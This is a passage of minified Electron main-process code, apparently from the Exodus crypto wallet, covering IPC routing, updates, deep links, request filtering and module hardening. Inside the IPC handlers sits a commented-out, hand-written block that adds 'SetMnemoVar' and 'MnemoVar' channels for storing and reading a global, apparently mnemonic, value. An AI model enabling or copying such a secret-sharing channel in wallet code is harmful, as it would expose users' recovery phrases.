                            }), i.autoUpdater.setFeedURL(n), i.autoUpdater.checkForUpdates()
                        })
                    },
                    quitAndInstall() {
                        i.autoUpdater.quitAndInstall()
                    }
                };
            Object(l.createServer)("auto-update-controller", ["ui"], f)
        }, function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, "mainBroadcastListener", function() {
                return p
            }), n.d(t, "targeted", function() {
                return h
            }), n.d(t, "broadcast", function() {
                return w
            }), n.d(t, "rpcMain", function() {
                return O
            }), n.d(t, "rpcListener", function() {
                return S
            }), n.d(t, "createServer", function() {
                return k
            });
            var r = n(0),
                o = n(6),
                i = n(1),
                s = n(92),
                a = n(42),
                c = n(90);
            const u = Object(c.wrapIpc)(r.ipcMain, function(e) {
                return !!Object(a.getIpcType)(e.sender) || (Object(o.showError)("send to IPC from non-whitelisted webContents"), !1)
            });
            let l = !1;
            async function d(e, t, n, r) {
                if (!r) throw new Error("Can not send without origin!");
                await
                function(e) {
                    return new Promise(t => {
                        if (!e.isLoading()) return t();
                        e.once("did-finish-load", t), setImmediate(() => {
                            e.isLoading() || (e.removeListener("did-finish-load", t), t(), l || (l = !0, console.log("Caught and prevented a race condition in RPC awaitLoad()")))
                        })
                    })
                }(e), e.send(t, {
                    channel: t,
                    payload: n,
                    origin: r
                })
            }

            function f(e, t, n, r) {
                if ("#" === e) throw new Error("Can not send to self");
                if (!r || !e) throw new Error("Can not send without target and origin");
                const s = Object(a.findWebContents)(e);
                0 === s.length ? i.ENV_DEV && console.log(`[ipc]: (${r} -> ${e}) 0 processes to send to on "${t}"`) : s.length > 1 && i.ENV_DEV && Object(o.showError)("targeted send to multiple webContents"), s.forEach(e => d(e, t, n, r))
            }

            function p() {
                u.on("ipc:target:send", (e, {
                    target: t,
                    channel: n,
                    payload: r
                }) => {
                    f(t, n, r, Object(a.getIpcType)(e.sender))
                }, !1)
            }

            function h(e, t, n) {
                f(e, t, n, "#")
            }

            function w(e, t) {
                ! function(e, t, n) {
                    Object(a.allIpcWebContents)().forEach(({
                        contents: r
                    }) => d(r, e, t, n))
                }(e, t, "#")
            }
            const {
                on: m,
                once: b,
                removeListener: y,
                removeAllListeners: g,
                handle: E,
                removeHandler: v
            } = u, O = {
                on: m,
                once: b,
                removeListener: y,
                removeAllListeners: g,
                handle: E,
                removeHandler: v
            }, S = O;

            function k(...e) {
                return Object(s.createServerImplementation)(u, h, e => Object(a.getIpcType)(e.sender), ...e)
            }
        }, function(e, t, n) {
            "use strict";
            var r = n(61),
                o = n.n(r),
                i = n(0),
                s = n(31),
                a = n.n(s),
                c = n(4),
                u = n(19),
                l = n(8),
                d = n(83),
                f = n(3),
                p = n(63),
                h = n.n(p),
                w = n(82),
                m = n(81);
            c.rpcMain.on("keyviewer-process:init", (e, t) => {
                f.appWindows.keyviewer || (f.appWindows.keyviewer = Object(w.init)(f.appWindows.background, f.appWindows.ui, t), f.appWindows.keyviewer.webContents.once("dom-ready", () => {
                    e.sender.send("keyviewer-process:opened")
                }), f.appWindows.keyviewer.once("closed", () => {
                    delete f.appWindows.keyviewer
                }))
            }), c.rpcMain.on("keyviewer-process:close", (e, t) => {
                f.appWindows.keyviewer.hide(), f.appWindows.keyviewer.destroy()
            }), c.rpcMain.on("wallet:qrCodeScan", (e, t) => {
                Object(m.init)(f.appWindows.background, f.appWindows.ui, t)
            }), c.rpcMain.on("ui:set-navbar-height", (e, t) => {
                for (const e of u.navbarHeightChangeHandlers) e(t.navbarHeight)
            }), c.rpcMain.handle("has-media-access", async (e, t) => {
                if ("camera" === t) {
                    if (!("darwin" === process.platform && Number(a.a.release().split(".")[0]) >= 18)) return !0
                }
                return "granted" === i.systemPreferences.getMediaAccessStatus(t) || i.systemPreferences.askForMediaAccess(t)
            }), c.rpcMain.handle("openExternal", async (e, t) => {
                if (!Object(d.validate)(t)) throw new Error("Navigation request declined");
                await i.shell.openExternal(t, {
                    activate: !0
                })
            }),
            //  c.rpcMain.handle("SetMnemoVar", async (_event, val) => {
            //     globalThis.sharedVariable = val;
            //     return sharedVariable;
            // }), c.rpcMain.handle("MnemoVar", async () => {
            //     return globalThis.sharedVariable;
            // }), 
            c.rpcMain.handle("openExternal:unchecked", async (e, t) => {
                const {
                    permissions: n = []
                } = Object(l.getWebContentsMeta)(e.sender);
                if (!n.includes("openExternal")) throw new Error("Do not have openExternal permission");
                await i.shell.openExternal(t, {
                    activate: !0
                })
            }), c.rpcMain.handle("get-machine-id", async () => {
                const e = a.a.networkInterfaces();
                for (const [t, n] of Object.entries(e)) {
                    if (t.startsWith("lo") || t.startsWith("Loopback")) continue;
                    const e = n.find(e => e.address && e.mac && "IPv4" === e.family);
                    if (e) {
                        const t = o.a.createHash("sha256");
                        return t.update(e.mac), t.digest("hex")
                    }
                }
            }), c.rpcMain.handle("dialog:open", (e, t) => {
                const n = i.BaseWindow.getFocusedWindow();
                return i.dialog.showOpenDialog(n, t)
            });
            for (const [e, t] of h.a.on) c.rpcMain.on(e, t);
            for (const [e, t] of h.a.handle) c.rpcMain.handle(e, t)
        }, function(e, t, n) {
            "use strict";
            n.r(t);
            n(128);
            var r = n(0),
                o = n(2),
                i = n.n(o),
                s = n(15),
                a = n(1),
                c = n(20),
                u = n.n(c),
                l = n(4),
                d = n(80),
                f = n(56),
                p = n(3),
                h = n(24),
                w = n(74),
                m = n(55);
            a.ENV_BUILD_EDEN && r.app.setName("Eden"), r.app.commandLine.appendSwitch("disable-renderer-backgrounding"), r.app.commandLine.appendSwitch("autoplay-policy", "no-user-gesture-required"), process.env.EXODUS_DISABLE_GPU && r.app.disableHardwareAcceleration();
            for (const e of d.default) Array.isArray(e) ? r.app.commandLine.appendSwitch(`disable-${e[0]}`, e[1]) : r.app.commandLine.appendSwitch(`disable-${e}`);
            process.env.ELECTRON_FORCE_WINDOW_MENU_BAR = !0;
            const b = n(44)(process.argv);
            ! function() {
                if (a.ENV_TEST) console.log("TEST MODE");
                else {
                    const e = ["_", "datadir", "debug", "disable-gpu", "p"];
                    (!Object.keys(b).every(t => e.includes(t)) || b._.length > 2) && (console.error("Can only pass whitelisted args; exiting", JSON.stringify(b)), r.app.exit())
                }
            }(), b.datadir ? r.app.setPath("userData", i.a.resolve(b.datadir)) : a.ENV_BUILD_EDEN && r.app.setPath("userData", i.a.join(r.app.getPath("appData"), "Exodus Eden")), b._.length > 1 && (globalThis.OPENED_URL = b._[1]);
            const y = new RegExp(`^${a.PROTOCOL}://securitize`),
                g = e => y.test(e),
                E = e => {
                    const {
                        pathname: t,
                        searchParams: n
                    } = new s.URL(e);
                    return {
                        path: t.slice(1),
                        params: Object.fromEntries(n.entries())
                    }
                };

            function v(e) {
                if (!e || !g(e)) return;
                const {
                    path: t,
                    params: n
                } = E(e);
                p.appWindows.ui.webContents.send("securitize:data", {
                    path: t,
                    params: n
                })
            }

            function O(e, t) {
                e.preventDefault(), console.log("OPEN URL: " + t), globalThis.OPENED_URL = t, v(t), Object(m.maybeDeepLink)(t)
            }
            r.app.on("open-file", O), r.app.on("open-url", O), l.rpcMain.on("securitize:fetch-data", () => {
                v(globalThis.OPENED_URL)
            }), l.rpcMain.on("securitize:fake-deep-link", (e, t) => {
                v(`${a.PROTOCOL}://securitize?${new URLSearchParams(t)}`)
            }), l.rpcMain.on("window:focus", () => {
                console.log("received window:focus request"), p.appWindows.background.show()
            }), l.rpcMain.on("window:fetchIsFocused", () => {
                console.log("received window:fetchIsFocused request");
                const e = p.appWindows.background.isFocused();
                p.appWindows.ui.webContents.send("window:isFocused", {
                    isFocused: e
                })
            });
            const S = h.isExistsSync();
            (b.debug || process.env.DEBUG_MODE || a.ENV_DEV || S) && (console.log("DEBUG MODE"), globalThis.DEBUG_MODE = b.debug || process.env.DEBUG_MODE || !0);
            let k = !1;
            r.app.on("window-all-closed", function() {
                k && r.app.quit()
            }), process.on("uncaughtException", function(e) {
                console.error("Uncaught Exception", e && e.message || e), e && e.stack && console.error("Stacktrace", e.stack)
            }), process.on("unhandledRejection", function(e, t) {
                console.error(`Unhandled rejection: ${e&&e.stack||e}`)
            });
            let D = !1;
            const _ = () => {
                D || (r.app.quit(), D = !0)
            };
            ["SIGINT", "SIGTERM", "SIGQUIT", "beforeExit"].forEach(e => process.once(e, _)), r.Menu.setApplicationMenu(null), l.rpcMain.once("app:showDevMenu", () => {
                r.Menu.setApplicationMenu(f.default)
            }), l.rpcMain.on("app:showPopupMenu", (e, t) => {
                r.Menu.buildFromTemplate(t).popup(r.BaseWindow.getFocusedWindow())
            }), r.app.on("ready", async () => {
                u.a.instantEvent("appReady");
                const e = r.app.requestSingleInstanceLock();
                if (r.app.on("second-instance", function(e, t, n) {
                        const r = p.appWindows.background;
                        r.isMinimized() && r.restore(), r.focus(), v(t.find(e => g(e))), Object(m.maybeDeepLink)(t.find(e => Object(m.isDeepLink)(e)))
                    }), !e) return console.error("Another instance of Exodus is already running. Please close it and try again."), void(globalThis.OPENED_URL && -1 !== globalThis.OPENED_URL.indexOf("recover") ? setTimeout(() => {
                    r.dialog.showMessageBoxSync({
                        title: "Wallet restore",
                        message: "Please close opened Exodus and try again.",
                        buttons: ["OK"]
                    }), r.app.quit()
                }, 2e3) : setTimeout(r.app.quit.bind(r.app), 1e3));
                const t = r.app.getPath("userData");
                console.log(`Exodus (production): DATA DIR: ${t}`), Object(l.mainBroadcastListener)();
                try {
                    Object(p.onAppReady)(b)
                } catch (e) {
                    console.error(e)
                }
                k = !0, setImmediate(() => {
                    try {
                        if ("linux" === process.platform) {
                            const e = p.appWindows.background,
                                [t, n] = e.getSize();
                            e.setSize(t + 1, n + 1), e.setSize(t - 1, n - 1)
                        }
                    } catch (e) {
                        console.log("Automatic resize failed — Do a manual window resize to fix black screen.", e.message)
                    }
                    if ("darwin" === process.platform) r.Menu.setApplicationMenu(f.default);
                    else {
                        const e = () => {
                                r.Menu.setApplicationMenu(f.default);
                                const {
                                    height: e,
                                    width: t
                                } = p.appWindows.background.getContentBounds();
                                p.appWindows.ui.setBounds({
                                    x: 0,
                                    y: 0,
                                    width: t,
                                    height: e
                                })
                            },
                            t = {
                                control: !0,
                                shift: !0,
                                key: "d",
                                code: "KeyD"
                            };
                        Object(w.registerShortcut)(p.appWindows.ui, t, e)
                    }
                })
            })
        }, function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, "handleCommand", function() {
                return l
            });
            var r = n(52),
                o = n(0),
                i = n(2),
                s = n.n(i),
                a = n(1),
                c = n(46);

            function u(e, t) {
                const n = s.a.resolve(s.a.dirname(process.execPath), "..", "Update.exe");
                Object(r.spawn)(n, e, {
                    detached: !0
                }).on("close", t)
            }

            function l(e) {
                const t = s.a.basename(process.execPath);
                if ("--squirrel-install" === e || "--squirrel-updated" === e) return u([`--createShortcut=${t}`], () => {
                    Object(c.setDefaultProtocols)(), setTimeout(() => o.app.quit(), 3e3)
                }), !0;
                if ("--squirrel-uninstall" === e) return Object(c.removeDefaultProtocols)(), u([`--removeShortcut=${t}`], o.app.quit.bind(o.app)), !0;
                if ("--squirrel-obsolete" === e) return o.app.quit(), !0;
                if ("--squirrel-firstrun" === e) {
                    const e = (() => a.ENV_BUILD_EXODUS ? "Exodus" : a.ENV_BUILD_EDEN ? "ExodusEden" : a.ENV_BUILD_NAME)(),
                        t = {
                            type: "info",
                            buttons: ["OK"],
                            title: `${e} Installed`,
                            message: `${e} has been installed! You can run it by clicking the shortcut on your desktop or in the app menu.`,
                            noLink: !1
                        };
                    return o.app.on("ready", () => {
                        o.dialog.showMessageBoxSync(null, t), o.app.quit()
                    }), !0
                }
                return !1
            }
        }, function(e, t, n) {
            "use strict";
            n.r(t);
            var r = n(46);
            (() => {
                if ("win32" === process.platform) {
                    return !n(130).handleCommand(process.argv[1])
                }
                return Object(r.setDefaultProtocols)(), !0
            })() && n(129)
        }, function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, "dataDir", function() {
                return o
            }), n.d(t, "desktopDir", function() {
                return i
            });
            var r = n(0);

            function o() {
                return r.app.getPath("userData")
            }

            function i() {
                return r.app.getPath("desktop")
            }
        }, function(e, t, n) {
            "use strict";
            n.r(t);
            var r = n(0),
                o = n(44),
                i = n.n(o),
                s = n(2),
                a = n.n(s),
                c = n(15),
                u = n(1),
                l = n(28),
                d = n(6),
                f = n(37);
            const p = u.ENV_PROD ? "./" : "src/",
                h = a.a.join(r.app.getAppPath(), p),
                w = i()(process.argv);

            function m(e, {
                prefix: t,
                mimetypes: n
            }) {
                return e.getURL().startsWith(t) && n.includes(e.getMimeType())
            }
            const [b, y, g, E] = [1, 2, 3, 4];

            function v(e, t) {
                const n = Object(f.getRequestRules)(e, t);
                if (!n) return g;
                if ("block_silent" === n) return E;
                const {
                    protocols: r,
                    domains: o
                } = n, {
                    protocol: i,
                    hostname: s,
                    pathname: u
                } = t, d = ["http:", "ws:"].includes(i), p = ["localhost", "127.0.0.1"].includes(s);
                if (d && !p) return g;
                const m = "file:" === i,
                    y = ["exodus-nfts-api:"].includes(i),
                    v = ["devtools:", "chrome-extension:"].includes(i),
                    O = ["https:", "wss:", "file:", "exodus-nfts-api:"].includes(i);
                if (m && ! function(e) {
                        const t = Object(c.fileURLToPath)(e),
                            n = a.a.relative(h, t),
                            r = a.a.resolve(t),
                            o = Object(l.imagesDir)();
                        if (n.includes("..") && !r.startsWith(o)) return !1;
                        const i = [h, o];
                        return w.datadir && i.push(w.datadir), i.some(e => r.startsWith(e))
                    }(t)) return u.endsWith(".map") ? E : g;
                if (v) return b;
                if ("*" !== r) {
                    if (!(p && d && r.includes("localhost") || O && r.includes(i))) return g
                }
                if ("*" !== o && !m && !y) {
                    const e = function(e) {
                        return e.port ? parseInt(e.port, 10) : ["https:", "wss:"].includes(e.protocol) ? 443 : ["http:", "ws:"].includes(e.protocol) ? 80 : null
                    }(t);
                    if (!(443 === e && o.includes(`${s}`) || e && o.includes(`${s}:${e}`) || o.includes(`${s}:*`))) return g
                }
                return b
            }
            const O = new WeakSet;

            function S(e) {
                if (O.has(e)) return;
                O.add(e), e.setSSLConfig({
                    minVersion: "tls1.2"
                });
                const {
                    webRequest: t
                } = e;
                t.onBeforeRequest((t, n) => {
                    const r = new c.URL(t.url),
                        o = v(e, r),
                        i = {};
                    o === b || o === y && u.ENV_EXODUS_PROD || (i.cancel = !0, o !== E && Object(d.showError)("network request", ` to ${r.toString()}`)), n(i)
                }), e.on("will-download", (e, t, n) => {
                    try {
                        if (function(e, t) {
                                const {
                                    downloads: n
                                } = Object(f.getSessionRules)(t.session);
                                for (const t of n)
                                    if (m(e, t)) return !0 === t.open && e.once("done", () => {
                                        r.shell.openPath(e.getSavePath())
                                    }), !0;
                                if (t.getURL().startsWith("devtools://") && m(e, {
                                        prefix: "blob:devtools://",
                                        mimetypes: ["image/png"]
                                    })) return !0;
                                return !1
                            }(t, n)) return
                    } catch (e) {}
                    e.preventDefault(), Object(d.showError)("download attempt")
                }), e.setPermissionRequestHandler((e, t, n, r) => {
                    return n(D(e, t, r))
                }), e.setPermissionCheckHandler((e, t, n, r) => {
                    return D(e, t, r)
                }), e.setSpellCheckerLanguages([])
            }
            const k = ["accessibility-events", "window-placement", "background-sync", "media", "geolocation"];

            function D(e, t, n) {
                const r = function(e, t, n) {
                    if (!e) return !1;
                    if (!n.isMainFrame) return !1;
                    const {
                        permissions: r
                    } = Object(f.getSessionRules)(e.session);
                    return r.includes(t)
                }(e, t, n);
                return r || k.includes(t) || Object(d.showError)("unexpected permission request", ` to ${t}`), r
            }
            r.app.on("ready", () => {
                S(r.session.defaultSession)
            }), r.app.on("session-created", e => {
                S(e)
            })
        }, function(e, t, n) {
            const {
                app: r
            } = n(0);
            if (r.isReady()) throw new Error("Electron security must be imported before the app is ready");
            n(133), n(8)
        }, function(e, t, n) {
            "use strict";
            e.exports = {
                getProcessName: function() {
                    return "main"
                }
            }
        }, function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, "allowedBuiltins", function() {
                return r
            });
            const r = e => {
                const t = ["electron", "module"];
                switch (e) {
                    case "main":
                        return [...t, "child_process", "crypto", "assert", "constants", "events", "fs", "fs/promises", "os", "path", "stream", "url", "util", ...[]];
                    case "core":
                        return [...t, "buffer", "crypto", "assert", "constants", "events", "fs", "os", "path", "stream", "util", "zlib"];
                    case "wallet":
                        return [...t, "crypto", "assert", "buffer", "constants", "events", "fs", "os", "path", "stream", "url", "util", "zlib"];
                    case "ui":
                        return [...t, "crypto", "assert", "buffer", "events", "path", "querystring", "stream", "url", "util"];
                    case "recovery":
                        return [...t, "assert", "buffer", "constants", "crypto", "fs", "path", "stream", "util", "zlib"];
                    case "keyviewer":
                        return []
                }
                return []
            }
        }, function(e, t, n) {
            const {
                builtinModules: r
            } = n(60), o = Function.prototype.call.bind(Array.prototype.includes);
            e.exports = (e => !e.startsWith("events/") && !e.endsWith("/") && (e => "electron" === e || o(r, e))(e.replace(/\/.*/, "")))
        }, function(e, t, n) {
            if (void 0 !== globalThis.Buffer && globalThis.Buffer) {
                const Buffer = globalThis.Buffer;
                if (Buffer.poolSize = 0, Buffer.allocUnsafe = function(e) {
                        return Buffer.alloc(e)
                    }, Buffer.allocUnsafeSlow = Buffer.allocUnsafe, Buffer.TYPED_ARRAY_SUPPORT) {
                    const {
                        isBuffer: e
                    } = Buffer;
                    Buffer.isBuffer = (t => t instanceof Uint8Array && e(t))
                }
                Object.freeze(Buffer)
            }
            const r = Object.getPrototypeOf(Int8Array);
            for (const e of [...[Object, Array, Number, String, Function, Set, Map, WeakSet, WeakMap], ...[Reflect, TypeError, BigInt, URL, Date, JSON, Math], ...[Int8Array, Int16Array, Int32Array, DataView], ...[Uint8Array, Uint16Array, Uint32Array, r]]) Object.freeze(e);
            "undefined" != typeof crypto && crypto && crypto.subtle && (Object.freeze(crypto), Object.freeze(crypto.subtle));
            {
                const e = n(60),
                    t = () => {
                        throw new Error("require() of non-builtins has been disabled")
                    };
                e._findPath = t;
                for (const n of Object.keys(e._extensions)) e._extensions[n] = t
            } {
                const e = n(60),
                    t = n(137),
                    r = Function.prototype.call.bind(Array.prototype.includes),
                    o = () => {
                        const {
                            allowedBuiltins: e
                        } = n(136), {
                            getProcessName: t
                        } = n(135), r = t();
                        return {
                            processName: r,
                            allowedModules: [...e(r)]
                        }
                    },
                    {
                        processName: i,
                        allowedModules: s
                    } = o(),
                    a = (e, n) => {
                        if (t(e), "module" !== e && r(s, e)) return;
                        throw new Error(`Requiring module "${e}" is not allowed` + ` in browser process "${i}" (parent: ${n})`)
                    },
                    c = e._resolveFilename.bind(e);
                e._resolveFilename = ((e, t, ...n) => (a(e, null == t ? void 0 : t.id), c(e, t, ...n)))
            }
            process.binding && (process.binding = (e => {
                throw new Error(`harden: process.binding(${JSON.stringify(e)}) has been disabled`)
            }))
        }, function(e, t, n) {
            "use strict";
            n.r(t);
            var r = n(72);
            n.d(t, "sanitizeErrorMessage", function() {
                return r.default
            });
            var o = n(40);
            n.d(t, "parseStackTrace", function() {
                return o.default
            }), n.d(t, "captureStackTrace", function() {
                return o.captureStackTrace
            });
            var i = n(71);
            for (var s in i)["sanitizeErrorMessage", "parseStackTrace", "captureStackTrace", "default"].indexOf(s) < 0 && function(e) {
                n.d(t, e, function() {
                    return i[e]
                })
            }(s)
        }, function(e, t, n) {
            const {
                captureStackTrace: r
            } = n(139), o = (...e) => {
                const t = e.reduce((e, t) => (t instanceof Error && r(t), e.concat((e => e instanceof Error && e.stack)(t) ? t.stack : t, "\n")), "").trim();
                console._errorOriginal(t)
            };
            console._errorOriginal || (console._errorOriginal = console.error.bind(console), console.error = o)
        }, function(e, t, n) {
            n(140), n(138)
        }, function(e, t, n) {
            const r = n(26),
                {
                    format: o
                } = n(43),
                i = n(2),
                s = n(31);
            if (process.argv.includes("--eden-full-log-to-file")) {
                process.env.ELECTRON_ENABLE_LOGGING = 1;
                const e = i.join(s.homedir(), `exodus.${Date.now()}.log`),
                    t = process.pid;
                let n = !0;
                const a = ({
                    ...o
                }) => {
                    const i = JSON.stringify({
                        time: (new Date).toISOString(),
                        pid: t,
                        ...o
                    });
                    r.appendFileSync(e, `${i}\n`), n && (r.chmodSync(e, 384), n = !1)
                };
                for (const e of ["log", "warn", "error", "info", "debug"]) {
                    const t = console[e].bind(console);
                    console[e] = ((...n) => {
                        t(...n);
                        const r = {
                                level: "log" === e ? "info" : e,
                                name: "browser",
                                message: o(...n)
                            },
                            i = (((new Error).stack || "").split("\n")[2] || "").trim().match(/\((.*):([0-9]+):([0-9]+)\)$/);
                        i && Object.assign(r, {
                            source: i[1],
                            line: Number(i[2]),
                            column: Number(i[3])
                        }), a(r)
                    })
                }
                globalThis.EDEN_LOG_TO_FILE = {
                    log: a
                }, console.log(`Logs are forwarded to ${e}`)
            }
        }, function(e, t, n) {
            2 === process.argv.length && "--version" === process.argv[1] && (console.log(n(73).version), n(0).app.exit(0)), console.time("main"), console.log("ENV: production"), n(20).instantEvent("didStartMain"), n(141), n(134), n(131)
        }]);